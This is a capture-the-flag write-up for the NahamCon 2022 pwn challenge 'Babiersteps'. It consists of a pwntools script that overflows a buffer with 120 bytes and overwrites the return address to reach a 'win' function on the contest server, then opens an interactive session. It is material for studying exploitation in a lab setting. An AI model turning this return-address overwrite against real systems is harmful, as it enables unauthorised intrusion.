---
layout: load_md
title: The White Circle | Nahamcon 2022 | Babiersteps Writeup
desc: Check out our writeup for Babiersteps for Nahamcon 2022 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2022
parent: nahamcon_2022
category: pwn
challenge: Babiersteps
tags: "pwn, twh, python"
date: 2022-05-03T00:00:00+00:00
last_modified_at: 2022-05-03T00:00:00+00:00
---


> Solved By : thewhiteh4t

```python
#!/usr/bin/env python3

from pwn import *

host = 'challenge.nahamcon.com'
port = 32628

offset = 120
junk = b'A' * offset
win_addr = 0x4011c9

le_win_addr = p64(win_addr, endianness='little')
payload = junk + le_win_addr

conn = remote(host, port)
conn.recv(1024)
conn.sendline(payload)
conn.interactive()
conn.close()
```

![](https://i.imgur.com/oGDnIF7.png)